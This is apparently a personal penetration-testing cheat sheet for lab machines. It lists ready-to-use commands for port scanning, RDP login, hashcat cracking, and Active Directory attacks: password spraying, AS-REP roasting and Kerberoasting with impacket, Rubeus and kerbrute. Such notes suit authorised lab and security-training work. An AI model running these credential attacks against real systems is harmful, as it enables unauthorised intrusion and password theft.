## Nmap

```sh
sudo nmap -p- -A -Pn -v --open $IP
```

```sh
sudo nmap -sS -sV -T4 -oN nmap_default.txt <IP>
```

### Edit /etc/hosts file

```sh
echo "10.129.76.146 sea.htb" | sudo tee -a /etc/hosts
```

### Connecting to RDP

```sh
xfreerdp3 /u:<username> /d:<domain> /p:<pwd> /v:<IP>
```

```sh
xfreerdp /cert-ignore /u:<uname> /d:<domain> /p:<pwd> /v:<IP>
```

### Hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes

```sh
hashcat -m <number> hash wordlists.txt --force
```

## Active Directory

### Password Spraying

_Crackmapexec - check if the output shows 'Pwned!'_

```sh
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success
```

```sh Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### AS-REP Roasting

_Hash of AS-REP Roastable accounts_

```sh
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request
```

### Kerberoasting

_dumping from compromised windows host, and saving with customname_

```sh
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
```
